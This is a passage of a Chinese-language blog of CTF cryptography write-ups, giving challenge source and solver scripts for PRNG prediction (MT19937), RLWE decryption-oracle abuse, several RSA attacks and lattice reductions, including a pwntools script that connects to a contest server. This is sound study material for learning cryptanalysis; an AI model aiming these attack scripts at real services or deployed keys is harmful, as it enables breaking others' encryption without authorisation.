221, 241, 37, 245, 1, 99, 9, 157, 99, 150, 47, 118, 225, 16, 13, 141, 135, 99, 18, 119, 63, 160, 6, 247, 27, 68, 45, 199, 86, 193, 252, 21, 135, 32, 42, 103, 114, 241, 49, 249, 182, 52, 18, 155, 157, 61, 4, 246, 158, 52, 118, 242, 195, 54, 139, 232, 100, 31, 11, 233, 58, 100, 101, 137, 83, 145, 209, 7, 241, 96, 57, 148, 207, 29, 237, 124, 177, 166, 161, 20, 116, 122, 61, 71, 46, 82, 18, 157, 253, 130, 112, 66, 94, 57, 221, 243, 222, 192, 147, 5, 130, 201, 174, 26, 160, 16, 188, 103, 187, 11, 238, 182, 144, 4, 137, 33, 84, 100, 7, 239, 219, 83, 112, 189, 166, 58, 93, 141, 30, 198, 220, 196, 118, 172, 5, 45]def decrypt(pixel,key1,key2,x0,m,n): num = m*n/8 seqs = [] x = x0 bins = '' tmp = [] for i in range(num): x = generate(x) tmp.append(x) seqs.append(int(x*22000)) for x in seqs: bin_x = bin(x)[2:] if len(bin_x) &lt; 16: bin_x = '0'*(16-len(bin_x))+bin_x bins += bin_x assert(len(pixel) == m*n) cipher = [ 0 for i in range(m) for j in range(n)] for i in range(m): for j in range(n): index = n*i+j ch = int(bins[2*index:2*index+2],2) pix = pixel[index] if ch == 0: pix = (pix^key1)&amp;0xff if ch == 1: pix = (~(pix^key1))&amp;0xff if ch == 2: pix = (pix^key2)&amp;0xff if ch == 3: pix = (~(pix^key2))&amp;0xff cipher[index] = pix return cipherdef generate(x): return round(r * x * (3 - x), 6)key = []for i, j in zip(m1, c1): key.append(i ^ j)'''key1 may 169 177 78 86if key1= 169 key2 only may 78 or 177 8 combinationsey1 = 169 ,key2 = 78 get result'''bitstream = ''X = []for i in key: if i == 78: bitstream += '10' if i == 169: bitstream += '00' if i == 177: bitstream += '11' if i == 86: bitstream += '01'key1 = 169key2 = 78S = time()X0 = int(bitstream[:16],2) / 22000.000000X1 = int(bitstream[16:32],2) / 22000.000000r = round(X1 / (3*X0 - X0**2),1)print(r)for x0 in range(10**6): x = round(x0 / 1000000.000000,6) bins = '' tmp = [] seqs = [] d = 16 for i in range(d): x = generate(x) tmp.append(x) seqs.append(int(x*22000)) for x in seqs: bin_x = bin(x)[2:] if len(bin_x) &lt; 16: bin_x = '0'*(16-len(bin_x))+bin_x bins += bin_x if bitstream[:d*16] == bins: x0 = round(x0 / 1000000.000000,6) breakprint(time()-S,x0)image = decrypt(c2,key1,key2,x0,24,16)data = ''.join(map(chr,image))print md5.new(data).hexdigest() 0x03 homoproblem123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119from poly import *from math import floor, logfrom copy import deepcopyimport osimport randomimport syswith open(\"/root/task/flag.txt\", \"rb\")as f: flag = f.read()q = 2**54n = 1024t = 83T = 100l = floor(log(q, t))delta = floor(q/t)mu = 0sigma = 1MENU = \\'''1.game2.decrypt'''def encode(s): _s = s + os.urandom(128 - len(flag)) tmp = bin(int.from_bytes(_s, \"big\"))[2:].zfill(n) tmp = list(map(int, tmp)) TMP = Poly(n, q) TMP.cofficient = deepcopy(tmp) return TMPdef Round(poly, t): c = deepcopy(poly) for i in range(c.n): c.cofficient[i] = c.cofficient[i] % t if c.cofficient[i] &gt;= t/2: c.cofficient[i] -= t return cdef keygen(): s = Poly(n, q) s.randomize(type=2, sigma=sigma, mu=mu) e = Poly(n, q) e.randomize(type=1, sigma=sigma, mu=mu) a = Poly(n, q) a.randomize(B=q) pk = [Round(-1*(a*s+e), q), a] return pk, sdef encrypt(pk, m): u = Poly(n, q) u.randomize(type=1, sigma=sigma, mu=mu) e1 = Poly(n, q) e1.randomize(type=1, sigma=sigma, mu=mu) e2 = Poly(n, q) e2.randomize(type=1, sigma=sigma, mu=mu) return [Round(pk[0]*u+e1+delta*m, q), Round(pk[1]*u+e2, q)]def decrypt(sk, ct): tmp = t * Round(ct[0] + ct[1] * sk, q) for i in range(tmp.n): tmp.cofficient[i] = round(tmp.cofficient[i] / q) return Round(tmp, t)def fun(): if not allowed: print(\"I can't let you use this.\") else: a = Poly(n, q) b = Poly(n, q) tmp = [0]*n print(\"c0:\") s = input().replace(\" \", \"\").split(\",\") a.cofficient = deepcopy(list(map(int, s))) print(\"c1:\") s = input().replace(\" \", \"\").split(\",\") b.cofficient = deepcopy(list(map(int, s))) assert a.cofficient != ct[0].cofficient and b.cofficient != ct[1].cofficient assert tmp != a.cofficient and tmp != b.cofficient print(decrypt(sk, [a, b]).cofficient)def game(): global allowed count = 0 random.seed(os.urandom(32)) print(\"play a game with me!\") for i in range(512): number = random.getrandbits(64) guess = int(input(\"your number:\")) if guess == number: count += 1 print(\"win\") else: print(f\"lose!my number is {number}\\n\") if count &gt;= 200: allowed = Truepk, sk = keygen()m = encode(flag)ct = encrypt(pk, m)allowed = Falseprint(pk[0].cofficient)print(pk[1].cofficient)print(ct[0].cofficient)print(ct[1].cofficient)while True: print(MENU) option = int(input()) if option == 1: game() elif option == 2: fun() else: print(\"error\") sys.exit(1) 还有个poly.py我到最后都没有用上。。就不放上来了 analyses这题有两部分 第一部分。让我们猜服务端生成的64bit随机数，512次机会，猜错了会告诉你随机数是什么，猜对了就继续，如果一共猜对200次以上就可以进入下一部分 第二部分。白给的同态加密 第一部分 MT19937其实这里考的就是 MT19937，这是python.random库用的伪随机数生成算法，状态有限，知道624*32 bit之后就能完全的算出后续的随机数。 还记得第一次解出MT19937就是我第一次比赛做密码，2020 N1CTF - VSS ，这道题当时做了一整场，始终没有做出来。看了wp才了解MT19937这种东西，不过也知道了一个可以用来预测随机数的库-&gt; randcrack , 当我们得到了624*32bit之后，就能利用这个库算出后续的随机数 而这里刚好够，一共512次机会，前312次错误刚好可以得到31264 bit也就是624\\32 bit，后面的200次机会就可以每次都猜中了。 第二部分 同态加密说是同态加密。。。但我好像没用到里面的知识？ 服务端提供了解密，我们是有密文的，按理来说直接给密文就行了，但是题目限制了提交上去解密的密文不能是flag的密文 考虑到整个过程都是的，直接给密文加上q就行了。。。 2021/5/18 吃饭的时候想着为啥题目是同态加密, 突然想到这玩意不就是个r-lwe吗, 本来密文有噪音就是可以的, 直接给c0,c1都加上1就行了, 噪音够小是不会影响解密的! exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081from pwn import *from randcrack import RandCrackimport randomimport refrom Crypto.Util.number import long_to_bytesR = lambda con: con.recv(1024)S = lambda con, x: con.sendline(x)con = remote('124.70.14.146', 23218)kkk = ''q = 2**54for _ in range(512): k = R(con).decode() kkk += k if 'game' in k: breakkkk = kkk.split('\\n')[:-5]pk = [0, 0]ct = [0, 0]pk[0] = kkk[0][1:-1].split(',')for i in range(len(pk[0])): pk[0][i] = int(pk[0][i])pk[1] = kkk[1][1:-1].split(',')for i in range(len(pk[1])): pk[1][i] = int(pk[1][i])ct[0] = kkk[2][1:-1].split(',')for i in range(len(ct[0])): ct[0][i] = int(ct[0][i])ct[1] = kkk[3][1:-1].split(',')for i in range(len(ct[1])): ct[1][i] = int(ct[1][i])print(len(pk[0]))rc = RandCrack()S(con, b'1')print(R(con).decode())for _ in range(312): S(con, b'1') resp = R(con).decode() # print(resp) num = re.findall('my number is (.*)', resp)[0] r = bin(int(num))[2:].zfill(64) r1 = r[:32] r2 = r[32:] rc.submit(int(r2, 2)) rc.submit(int(r1, 2))num = 0for _ in range(200): S(con, str(rc.predict_getrandbits(64)).encode()) if 'win' in R(con).decode() : num += 1 print(num)c0 = ''for i in ct[0]: c0 += str(i+q)+','c1 = ''for i in ct[1]: c1 += str(i + q)+','S(con, b'2')print(R(con).decode())S(con,c0[:-1].encode())print(R(con).decode())S(con,c1[:-1].encode())flag = ''while True: flag += R(con).decode() if ']' in flag: breakprint(flag)'''result [...] 出来的结果就是一堆0,1'''flag = [...]for i in range(len(flag)): flag[i] = str(flag[i])flag = int(''.join(flag),2)print(long_to_bytes(flag)) 0x04 oddaes 不会。。。差分分析，一直都每学会过，等一个wp学习 0x05 rsaproblem1234567891011121314151617181920212223242526272829303132333435363738from flag import text,flagimport md5from Crypto.Util.number import long_to_bytes,bytes_to_long,getPrimeassert md5.new(text).hexdigest() == flag[6:-1]msg1 = text[:xx]msg2 = text[xx:yy]msg3 = text[yy:]msg1 = bytes_to_long(msg1)msg2 = bytes_to_long(msg2)msg3 = bytes_to_long(msg3)p1 = getPrime(512)q1 = getPrime(512)N1 = p1*q1e1 = 3print pow(msg1,e1,N1)print (e1,N1)p2 = getPrime(512)q2 = getPrime(512)N2 = p2*q2e2 = 17e3 = 65537print pow(msg2,e2,N2)print pow(msg2,e3,N2)print (e2,N2)print (e3,N2)p3 = getPrime(512)q3 = getPrime(512)N3 = p3*q3print pow(msg3,e3,N3)print (e3,N3)print p3&gt;&gt;200 analyses白给签到。 过小导致直接开次方得 共模攻击 已知高位 都是基础，不详细写了 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from Crypto.Util.number import long_to_bytesfrom gmpy2 import irootn = 113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147c = 59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646e = 65537high_p = 7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902# high bits of p without low zeroskbits = 200_p = high_p&lt;&lt;kbitsPR.&lt;x&gt; = Zmod(n)[]f = x + _proots = f.small_roots(X=2^kbits,beta=0.4)p = _p+int(roots[0])q = n // pd = int(inverse_mod(e,(p-1)*(q-1)))msg3 = pow(c,d,n)#msg2n = 111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977c1 = 54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610c2 = 91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950e1 = 17 e2 = 65537# 利用扩展欧几里得求出s1 s2def EX_GCD(a, b, arr, n=0): # 扩展欧几里得 if b == 0: arr[0] = 1 arr[1] = 0 return a g = EX_GCD(b, a % b, arr) t = arr[0] arr[0] = arr[1] arr[1] = t - int(a / b) * arr[1] return g # output: s * a + t * b = 1 g:最大公因数 arr[0] = s, arr[1] = tarr = [0, 0]EX_GCD(e1, e2, arr)s1 = arr[0]s2 = arr[1]msg2 = (pow(c1, s1, n) * pow(c2, s2, n)) % n# msg1 c = 19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893msg1 = iroot(c,3)[0]msg = long_to_bytes(msg1) + long_to_bytes(msg2) + long_to_bytes(msg3)import md5print(md5.new(msg).hexdigest())","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"},{"name":"RSA","slug":"RSA","permalink":"http://tearsjin.github.io/tags/RSA/"},{"name":"WriteUp","slug":"WriteUp","permalink":"http://tearsjin.github.io/tags/WriteUp/"},{"name":"AES","slug":"AES","permalink":"http://tearsjin.github.io/tags/AES/"},{"name":"PRNG","slug":"PRNG","permalink":"http://tearsjin.github.io/tags/PRNG/"}]},{"title":"writeup-for-2021-redhat CTF","date":"2021-05-16T02:49:52.000Z","path":"2021/05/16/writeup-for-2021-redhat-CTF/","text":"大家好，这里k1rit0，今天带大家了解红帽杯Crypto wp。到底是怎么一回事呢？让我们一起来看看吧。 说起红帽杯，相信大家一定很熟悉，但Crypto是什么呢？就让小编带大家一起了解吧 其实，Crypto就是search，大家可能会惊讶，Crypto竟然就是search！ 这就是Crypto wp了，不知道大家有什么想法呢？欢迎在屏幕下方留言哦https://pwnthem0le.polito.it/2020/12/20/hxpCTF-2020-Hyper-writeup/https://www.secmem.org/blog/2020/09/20/poka-science-war-hacking/ XD XD XD XD 笑死根本笑不死, 全是有原题, 做的快还不如别人搜的快, 不过第二题超椭圆曲线还在看paper, 现在还是不会(24页, 看都看不懂) 游戏体验极差, 做完题就只能看着队友输出, 逆向爷爷开心到起飞了 就把自己做第一题的思路写一下吧 primegameproblem123456789101112131415161718192021222324252627282930313233343536373839404142#!/usr/bin/env python3from decimal import *import mathimport randomimport structfrom flag import flagassert (len(flag) == 48)msg1 = flag[:24]msg2 = flag[24:]primes = [2]for i in range(3, 90): f = True for j in primes: if i * i &lt; j: break if i % j == 0: f = False break if f: primes.append(i)getcontext().prec = 100 #设置有效数字keys = []for i in range(len(msg1)): keys.append(Decimal(primes[i]).ln())sum_ = Decimal(0.0)for i, c in enumerate(msg1): sum_ += c * Decimal(keys[i])ct = math.floor(sum_ * 2 ** 256)print(ct)sum_ = Decimal(0.0)for i, c in enumerate(msg2): sum_ += c * Decimal(keys[i])ct = math.floor(sum_ * 2 ** 256)print(ct) analyses一看到还以为是小数的背包问题, 怎么可能嘛, 看一下式子就能懂了这里多了个 就是把取整直接看成减去一个小数了 是已知的, 而且是小数, 不能直接造格子, 但我们把分配给每一项就不一样了, 对于其中一项记每一项都这么干, 那么整个就会变成其中系数都是特别大的数, 而都非常小, 这时我们就可以用背包问题的解法求出 构造格子规约就能得到了 exp12345678910111213141516171819202122232425262728293031from decimal import *import mathprimes = [2]for i in range(3, 90): f = True for j in primes: if i * i &lt; j: break if i % j == 0: f = False break if f: primes.append(i)getcontext().prec = 100keys = []for i in range(24): keys.append(math.floor(Decimal(primes[i]).ln()*2**256))c1 = 597952043660446249020184773232983974017780255881942379044454676980646417087515453c2 = 425985475047781336789963300910446852783032712598571885345660550546372063410589918L = matrix([[0 for _ in range(25)] for _ in range (25)])for i in range(24): L[i,-1] = keys[i] L[i,i] = 1L[-1,-1] = -c1for i in L.LLL()[0][:-1]: print(chr(i),end='')L[-1,-1] = -c2for i in L.LLL()[0][:-1]: print(chr(i),end='')","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"},{"name":"WriteUp","slug":"WriteUp","permalink":"http://tearsjin.github.io/tags/WriteUp/"}]},{"title":"writeup for 2021 MRCTF","date":"2021-04-17T11:21:47.000Z","path":"2021/04/17/writeup-for-2021-MRCTF/","text":"啊比赛的时候刚好和npy出去玩了, 也没怎么看题, 就看了半个下午的Common prime rsa. 也没整出来.最近又在忙学校的HW就是什么成果都没, 只能看着大佬干自己划水的那种. 所以题目复现什么的就慢了好多.慢慢的更新完吧, 每次做题都一堆paper, 想慢慢的看完只能花多点时间了吧 Strange_GCDproblem12345678910111213141516171819202122232425262728293031323334353637383940414243444546from gmpy2 import *from random import *from Crypto.Util.number import *from os import urandomfrom flag import flagP_bits = 444Q_bits = 666R_bits = 333key_num = 9e = 0x1337while True: could_not_solve = False p = getPrime(P_bits) if gcd(p-1, e) != 1: continue R = [] Q = [] N = [] for i in range(key_num): Q.append(getPrime(Q_bits)) R.append(getrandbits(R_bits)) N.append(p * Q[-1] + R[-1]) if gcd(Q[-1], e) != 1: could_not_solve = True break if not could_not_solve: breakC = []assert len(flag) == 45for i in range(key_num): tmp_cipher = flag[i*len(flag)//key_num:(i+1)*len(flag)//key_num].encode() tmp_cipher = urandom(128 - len(tmp_cipher)) + tmp_cipher tmp_cipher = pow(bytes_to_long(tmp_cipher), e, p * Q[i]) C.append(tmp_cipher)print('N =', N)print('C =', C)'''N = [...]C = [...]''' analyses这题比完赛以后做的, paper也是直接就看别人找了自己找太浪费时间啦 做的时候没看paper, 造格子没去思考怎么消去比较大的项, 看了paper才明白, AGCD先来看看这边的公钥生成, 这共生成了9个其中的位数分别为, 这个问题看着像LWE但是我们只知道. 尝试了一下造格子也没啥结果, 找paper找到了这个-&gt; The Approximate GCD Problem 这里面提供了一个造格子的方法来分解 其实这里面就有一种造格子的思想吧? 我们想要通过格基规约得出结果, 那么我们必须保证我们需要求出的量不会很大(只有这样才能使得我们要求的向量是最短向量), 所以我们的一个思路, 可以是消去一些比较大的数, 留下一些比较小的. 在这里我们先拿两行等式来分析我们可以看到式子里有个非常大的, 可以想个办法消去这个大的项并且不引入比他更大的项. 一个办法就是通过减法!通过减法可以将 bits的变成了小一点的 bits 的, 这里小了点就可以尝试做文章了. 我们可以根据这个式子写出剩下的一样的式子根据这个式子, 可以造出格子 的取值这里有个参数需要确定下来, 这个参数跟最短向量的上界有关, 一直以来这个参数都是用来调目标向量长度和格的行列式用的, 也没有具体的分析过, 每次做的时候都直接爆破, 这次慢慢分析了一下. 先来看我们要求的向量, 暂时记为再来看看 格子是9维的, 那么我们可以有一个粗略的不等式 通过简单的计算就可以得到得到参数的大概取值范围, 选一个中间的就行了, 想刺激一点可以试试130 359之类的(反正我试了都是可以的). (2) 式只是粗略得到的, 因为上界还有更严格的条件而且LLL算法实际上要比理论上要好…. 我们构造出格子并规约后就能得到了, 剩下的就是仿造这个格子构造求的格子, 求出所有的以后, 因为 , 所以, 直接就可以求出了, 继续求出,然后就是正常的RSA解密了. exp1234567891011121314151617181920212223242526272829from Crypto.Util.number import long_to_bytesN = [...]C = [...]Q = []R = []D = []t = 0for _ in range(9): M = 2^130 L = [[0 for _ in range(9)] for _ in range(9)] L[0] = [M]+N[0:t] + N[t+1:] for i in range(9): L[i][i] = - N[t] L[0][0] = M MQ = abs(matrix(L).LLL()[0][0]) assert MQ % M == 0 Q.append(MQ // M) t+=1for n,q in zip(N,Q): R.append(n % q)p = (N[0] - R[0]) // Q[0]for i in range(9): phi = (p-1) * (Q[i]-1) D.append(inverse_mod(0x1337,phi))for c,d,q in zip(C,D,Q): print(long_to_bytes(pow(c,d,p*q))[-5:].decode(),end='') Common_Prime_RSAproblem12345678910111213141516171819202122232425262728293031323334353637from Crypto.Util.number import *from secret import flagdef get_my_prime(nibt, gamma): g = getPrime(int(nibt * gamma)) while True: p = 2 * g * getPrime(int(nibt * (0.5 - gamma))) + 1 if isPrime(p): break while True: q = 2 * g * getPrime(int(nibt * (0.5 - gamma))) + 1 if isPrime(q): break assert 2 * p &gt; q and 2 * q &gt; p return p, q, gp1, q1, g1 = get_my_prime(1024, 0.2247)p2, q2, g2 = get_my_prime(1024, 0.3247)n1 = p1 * q1n2 = p2 * q2print(hex(n1))# 0x48b11209b62c5bc580d00fc94886272b92814ce35fcd265b2915c6917a299bc54c2c0603c41f8bf7c8f6f2a545eb03d38f99ec995bf6658bb1a2d23056ee21c7230caa2decec688ea9ee00b0d50b39e8cd23eb2c3ddeb20f5ab26777b80052c171f47b716e72f6aee9cece92776fc65119046f9a1ad92c40e2094d7ed7526d49print(hex(pow(bytes_to_long(b'Common prime RSA is a variant of RSA' + long_to_bytes(g1) + b'And the common factor g is large prime and p=2ga+1 q=2gb+1'), 3, n1)))# 0x27d8d7249643668ffc115be8b61775c60596e51f6313b47ad5af8493526922f5e10026a2cdaef74e22c3eec959dd8771abe3495b18d19f97623f5a3f65f22ff8fc294fc37ceb3b43ebbbf8a9bcf622922e22c5520dbd523483b9dc54fdffcd1a1b3f02ca1f53b75413fb79399ca00034f2acf108ac9a01bd24d2b9df6e27d156print(hex(pow(g2, 65537, n1)))# 0xeaf06b9050a809659f962251b14d6b93009a7010f0e8d8f0fa4d71591757e98243b8ff50ec98a4e140fd8a63bbb4b8bb0a6d302a48845b8b09d1e40874fcb586ddccbb0bbf86d21540ec6c15c1d2bf925942f6f384fdc1baae7f8e06150ccd9459eb65d0f07eea16a911fa0a17e876a145dbfec83537ca2bee4641897b9f7f5print(hex(n2))# 0x6d457110d6044472d786936acbd3cd93c7728daa3343b35ccaa5c55eba6b35c28c831bb245b8cdd8fc8cb67a72f57e62a0e1259f5e804c487a8478f6895b302d39277bd73947598a5f8ec0a535be9e9a4d34df91df948ee44cc3d13d14e23b9651089e4767c7f0e7245df55619c92fe24483225d35f5f3ee6f74375065766ffdprint(hex(pow(bytes_to_long(flag.encode()), 65537, n2)))# 0x15be2b0eaef8837a753587c47d3f31696a7d239d88837a9b7d903cd0d0648ef8e225ea555402693a23f305d19e7e13905be61b44c651dba5b26614bcf876234e765a724e0ed8af4a4e408e6a233c48ab9cc63e9c552ef9cd1999512aa0aca830fe6cbcbcc3c6bb354903124a2c3a12d442cdbdefdae6576f4bbc1515051b7111 analyses这道题做的时候自己踩了坑, 也没做出来, 后面看wp找到了那个paper才大概明白, 关于界的确定还得谢谢d33师傅. coppersmith这题的第一个problem就是求解, 第一个明文可以分成三部分和我们都是知道的, 而和的位数分别为 所以理论上式可以写成这里就有个坑了, 字符串在拼接的时候肯定都是完整的字节在拼的, 所以每一段的位数都应该是8的倍数才对, 所以正确的式应该为: 的位数为, 是满足coppersmith的条件的. 我们记, 那么就有, 化成首一多项式后coppersmith method即可求出 further attacks on server-aided rsa我们从上部分得到了 , 我们可以看看和的关系, 为了方便讨论, 直接记那么我们有这里设, 那么式可以化成这里的 , 也就是把看成是的结果. 那么都是可以计算出来的, 重点在于新引入的, 求出就可以求了 paper里提供了一种利用bsgs北上广深思想的方法来求出这个c, 但这题跟paper在c的界上有区别. 原paper是这样的, 我们随便找一个素数 , 观察下面的式子为什么没有了呢? 因为 . 然后求一下的上界, 后面要用到记, 我们有 , paper里提到了这个是很大概率相等的, 有师傅知道为什么吗?所以我们可以用bsgs的思想, 计算两组数.其中 在这两组数中搜索碰撞, 也就是 . 找到碰撞以后就可以计算了, 有了就可以分解了 当我看完paper以后兴奋的写了, 却发现这个北上广深把我内存全部吃完都没有结果(早上起来发现电脑屏幕都打不开了….怎么会没结果啊…只能去看d33师傅的wp了! 因为他什么都会, 看完才明白原来paper里的界太松散了, 导致太大, 跑出来需要多几根内存才行, 可是我只有一根8G的内存. d33师傅的界: 因为的位数相同, 所以我们还有一个隐藏的关系式这个式子很重要, 我们继续观察一下和的关系, 我们可以根据基本不等式写出上界, 再根据式写出下界根据这个, 咱们就有一个更加严格的的界同样的, 计算, 再用bsgs就可以求出了, 但我8G的小内存依旧跑不出来, 只能借用一下d33师傅的数据了 分解了就能求出, 由于的位数比较大, , 直接就有:也可以直接求出来了, 然后依旧是分解, 就可以求出flag了 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from Crypto.Util.number import long_to_bytes as l2b,bytes_to_long as b2lfrom time import timefrom gmpy2 import irootn1 = 0x48b11209b62c5bc580d00fc94886272b92814ce35fcd265b2915c6917a299bc54c2c0603c41f8bf7c8f6f2a545eb03d38f99ec995bf6658bb1a2d23056ee21c7230caa2decec688ea9ee00b0d50b39e8cd23eb2c3ddeb20f5ab26777b80052c171f47b716e72f6aee9cece92776fc65119046f9a1ad92c40e2094d7ed7526d49n2 = 0x6d457110d6044472d786936acbd3cd93c7728daa3343b35ccaa5c55eba6b35c28c831bb245b8cdd8fc8cb67a72f57e62a0e1259f5e804c487a8478f6895b302d39277bd73947598a5f8ec0a535be9e9a4d34df91df948ee44cc3d13d14e23b9651089e4767c7f0e7245df55619c92fe24483225d35f5f3ee6f74375065766ffdc1 = 0x27d8d7249643668ffc115be8b61775c60596e51f6313b47ad5af8493526922f5e10026a2cdaef74e22c3eec959dd8771abe3495b18d19f97623f5a3f65f22ff8fc294fc37ceb3b43ebbbf8a9bcf622922e22c5520dbd523483b9dc54fdffcd1a1b3f02ca1f53b75413fb79399ca00034f2acf108ac9a01bd24d2b9df6e27d156c2 = 0xeaf06b9050a809659f962251b14d6b93009a7010f0e8d8f0fa4d71591757e98243b8ff50ec98a4e140fd8a63bbb4b8bb0a6d302a48845b8b09d1e40874fcb586ddccbb0bbf86d21540ec6c15c1d2bf925942f6f384fdc1baae7f8e06150ccd9459eb65d0f07eea16a911fa0a17e876a145dbfec83537ca2bee4641897b9f7f5c3 = 0x15be2b0eaef8837a753587c47d3f31696a7d239d88837a9b7d903cd0d0648ef8e225ea555402693a23f305d19e7e13905be61b44c651dba5b26614bcf876234e765a724e0ed8af4a4e408e6a233c48ab9cc63e9c552ef9cd1999512aa0aca830fe6cbcbcc3c6bb354903124a2c3a12d442cdbdefdae6576f4bbc1515051b7111a = b2l(b'Common prime RSA is a variant of RSA') &lt;&lt; 696b = b2l(b'And the common factor g is large prime and p=2ga+1 q=2gb+1')mbar = a+bR.&lt;x&gt; = Zmod(n1)[]f = ((2^464) * x + mbar) ^ 3 - c1f = f.monic()g1 = int(f.small_roots(X=2^230,beta=1)[0])beta = 2* g1v = ((n1 - 1) // beta)% betau = ((n1 - 1) // beta - v) // betab = pow(2,beta,n1)left = (2*int(sqrt(n1))//beta-2-v)//beta right = (3*int(sqrt(2)*sqrt(n1))//(2*beta) - 2 - v )//beta D = int(sqrt(right - left)) + 1############################################################## 这部分应该是bsgs部分由于没办法跑出结果,无法确定自己的算法是否正确 ## 所以就先不放出来了,想知道具体的可以找d33师傅的博客 ##############################################################c=left+698170*D+5980588xy = u - c x_y = v + c * betax = var('x')f = x^2 - x_y * x + xyx,y = f.roots()[0][0],f.roots()[1][0]p,q = x *beta+1,y*beta+1assert p*q == n1g2 = int(pow(c2,int(inverse_mod(65537,(p-1)*(q-1))),n1))beta = 2 * g2x_y = ((n2 - 1) // beta)% betaxy = ((n2 - 1) // beta - x_y) // betax = var('x')f = x^2 - x_y * x + xyx,y = f.roots()[0][0],f.roots()[1][0]p,q = x *beta+1,y*beta+1assert p*q == n2l2b(pow(c3,int(inverse_mod(65537,(p-1)*(q-1))),n2)) Strange_CRTproblem1234567891011121314151617181920212223242526272829303132333435from gmpy2 import *from random import *from Crypto.Util.number import *from flag import flagbeta = 0.34delta = 0.02amplification = 2048p = getPrime(int(beta * amplification))q = getPrime(int((1 - beta) * amplification))N = p * qwhile True: dq = getrandbits(int(delta*amplification)) dp = getrandbits(int((beta-delta) * amplification)) if (dp-dq) % gcd(p-1, q-1) != 0: continue d = ((inverse((p-1)//gcd(p-1, q-1), (q-1)//gcd(p-1, q-1)) * (dq-dp)//gcd(p-1, q-1)) % ((q-1)//gcd(p-1, q-1))) * (p-1) + dp if gcd(d, (p-1)*(q-1)) == 1: breake = inverse(d, (p-1)*(q-1))m = bytes_to_long(flag.encode())c = pow(m, e, N)print('N =', N)print('e =', e)print('c =', c)'''N = 7194944829894746935571965271122989443610702698015123026500274312320541540511952275333536082176132102091625202863345739074691901574020649953130369453360247690506566827078013306825941200018330639608298539682191482947557146237487451707849833303794107411686130468587672820352641436722348277258977791778239539008852841749667581869688275892813664557078043533743669277649148468667399393518112220602616186358353262921270486781426670131125521444335280904901224934061164334131460273779473387748722008412594372005590209919098686472153912130124772089012962023984089123929555594332030502775588070235834837667605812843128059372243e = 5872666789397408936685003821802975734744078884385553897196686533187747297681714766542317071546532454504513425295170366015384657690105523240363850101369048640430719519784564240908244756652800934680608667950183962226340288720771217107508516125044088043789281574833079766048266075717484676158307477384862873719462770774288252074344824446884295300603035728339571606659365040029505127532956295163195257002051007447197735267997104725561159289832252522298457628452222155625714679911912616173849423059919537353814530280736653541415686756485413316581322357887750268983241858913704388088485132644523120028234659344174431547087c = 6601667269134560091452287214083525217696007424340765571114688738279264700361513951309195757650152324371826111195352731779137577044473630747863137747356695892337017953751159248388157498368915463745769509485009626774902347006319659852239932231921393353157319713540010424345134411781723171111939891127671029064626426950125001347122070491553845919803891156107693973027238705710354919725550360159383455222982999904576805089837067774838194257113022653159325313574447189639317397889065351340828031907571541750274329094240472180870714728295651611160552345500801797030280900507979459558944006193012524181456837126192865748097''' May2002_Chapter_CryptanalysisOfUnbalancedRSAWi 这篇paper介绍了针对dp过小并且p,q相差过大的情况下对rsa的一种攻击方法, 具体的原理可以看这篇论文, 这边就简单的说一下条件 要使用这个攻击方法必须满足两个条件越小越好吧具体的界我也没看明白这个方法利用了一个定理 (Howgrave-Graham) Let f (x, y) be a polynomial that is a sum of at most ω monomial. Suppose f (x0, y 0) = 0 mod pm for some positive integer m, where |x0| ≤ X and |y0| ≤ Y . If || f (xX, yY )|| &lt; pm √ω , then f (x0, y 0) = 0 holds over the integers. 是一个最大w阶的多项式, 假设存在,对于一些正整数m有, 如果, 那么在整数上成立, 垃圾翻译 大概就是这个意思 构造格其中 这个格子每一行都是的倍数, 所以最后组成的最短行向量中的替换成, 得到的方程的根就是,这个方程的根. 所以直接规约格基, 把最短向量中的都除掉, 利用得到的系数重新构造一个整数上的方程, 最后因式分解找到一次的项的系数就是 exp123456789101112131415161718192021222324252627282930313233343536373839404142from sage.all import *from Crypto.Util.number import long_to_bytesN = 7194944829894746935571965271122989443610702698015123026500274312320541540511952275333536082176132102091625202863345739074691901574020649953130369453360247690506566827078013306825941200018330639608298539682191482947557146237487451707849833303794107411686130468587672820352641436722348277258977791778239539008852841749667581869688275892813664557078043533743669277649148468667399393518112220602616186358353262921270486781426670131125521444335280904901224934061164334131460273779473387748722008412594372005590209919098686472153912130124772089012962023984089123929555594332030502775588070235834837667605812843128059372243e = 